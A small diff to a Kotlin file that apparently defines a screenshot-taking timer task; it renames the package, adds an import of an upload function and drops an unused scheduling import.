@@ -1,6 +1,7 @@
-package services
+package utils
 
 import kotlinx.coroutines.*
+import services.uploadFile
 import java.awt.GraphicsEnvironment
 import java.awt.Rectangle
 import java.awt.Robot
@@ -8,7 +9,6 @@ import java.io.File
 import java.time.LocalDateTime
 import java.util.*
 import javax.imageio.ImageIO
-import kotlin.concurrent.schedule
 
 private class ScreenshotTask: TimerTask() {
     override fun run() {
